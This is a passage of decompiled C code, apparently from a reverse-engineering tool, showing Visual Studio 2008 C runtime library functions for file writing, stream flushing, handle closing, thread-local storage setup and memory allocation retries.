  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_00414a8d;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_00414a8d;
  }
  piVar4 = &DAT_0046eb40 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_00414a8d;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_004146fe:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_004149fe:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_00414a0a:
      if (local_1acc != (char *)0x0) goto LAB_00414a8d;
      goto LAB_00414a13;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_00414a4f;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_004149fe;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_00414a0a;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004149fe;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_00414a0a;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_004149fe;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_00414a0a;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_004146fe;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_00414565;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_00414565:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004149fe;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_004149fe;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_004149fe;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_004149fe;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_00414a0a;
    }
LAB_00414a13:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_00414a8d;
    }
  }
LAB_00414a4f:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_00414a8d:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_00414b6c();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00414b6c(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_0046fc80; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_0046ec60 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_0046ec60 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_00414cfa();
    }
  }
  FUN_00414d29();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_00414cfa(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_0046ec60 + unaff_ESI * 4));
  return;
}



void FUN_00414d29(void)

{
  FUN_00412cbf(1);
  return;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_0046eb40 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_0046eb40 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_00414da1;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_00414da3;
    }
  }
LAB_00414da1:
  DVar4 = 0;
LAB_00414da3:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0046eb20)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0046eb40)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_00414e9a();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00414e9a(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_0042b694);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_0042b690 != -1)) {
    iVar3 = DAT_0042b690;
    pcVar2 = (code *)TlsGetValue(DAT_0042b694);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_00414f35;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"EncodePointer");
LAB_00414f35:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_0042b694);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_0042b690 != -1)) {
    iVar3 = DAT_0042b690;
    pcVar2 = (code *)TlsGetValue(DAT_0042b694);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_00414fb0;
    }
  }
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL"), hModule == (HMODULE)0x0))
  {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,"DecodePointer");
LAB_00414fb0:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_0042b694);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_0042d884);
    TlsSetValue(DAT_0042b694,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_0042b690 != -1) {
    iVar2 = DAT_0042b690;
    pcVar1 = (code *)__decode_pointer(DAT_0042d88c);
    (*pcVar1)(iVar2);
    DAT_0042b690 = -1;
  }
  if (DAT_0042b694 != 0xffffffff) {
    TlsFree(DAT_0042b694);
    DAT_0042b694 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  _Ptd->_pxcptacttab = &DAT_004255e0;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"EncodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,"DecodePointer");
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_0042b7e0;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_00415111();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_0042bde8;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0041511a();
  return;
}



void FUN_00415111(void)

{
  FUN_00412cbf(0xd);
  return;
}



void FUN_0041511a(void)

{
  FUN_00412cbf(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_0042b690;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_0042b690;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_0042d888);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_004152d0(void)

{
  FUN_00412cbf(0xd);
  return;
}



void FUN_004152dc(void)

{
  FUN_00412cbf(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(L"KERNEL32.DLL");
  }
  if (hModule != (HMODULE)0x0) {
    DAT_0042d880 = GetProcAddress(hModule,"FlsAlloc");
    DAT_0042d884 = GetProcAddress(hModule,"FlsGetValue");
    DAT_0042d888 = GetProcAddress(hModule,"FlsSetValue");
    DAT_0042d88c = GetProcAddress(hModule,"FlsFree");
    if ((((DAT_0042d880 == (FARPROC)0x0) || (DAT_0042d884 == (FARPROC)0x0)) ||
        (DAT_0042d888 == (FARPROC)0x0)) || (DAT_0042d88c == (FARPROC)0x0)) {
      DAT_0042d884 = TlsGetValue_exref;
      DAT_0042d880 = (FARPROC)&LAB_00414fc2;
      DAT_0042d888 = TlsSetValue_exref;
      DAT_0042d88c = TlsFree_exref;
    }
    DAT_0042b694 = TlsAlloc();
    if (DAT_0042b694 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_0042b694,DAT_0042d884);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_0042d880 = (FARPROC)__encode_pointer((int)DAT_0042d880);
    DAT_0042d884 = (FARPROC)__encode_pointer((int)DAT_0042d884);
    DAT_0042d888 = (FARPROC)__encode_pointer((int)DAT_0042d888);
    DAT_0042d88c = (FARPROC)__encode_pointer((int)DAT_0042d88c);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_004151b6;
      pcVar3 = (code *)__decode_pointer((int)DAT_0042d880);
      DAT_0042b690 = (*pcVar3)(puVar5);
      if ((DAT_0042b690 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_0042b690;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_0042d888);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_0042d890 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042d890 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_0042d890 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042d890 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_0042d890 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042d890 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __recalloc_crt
// 
// Library: Visual Studio 2008 Release

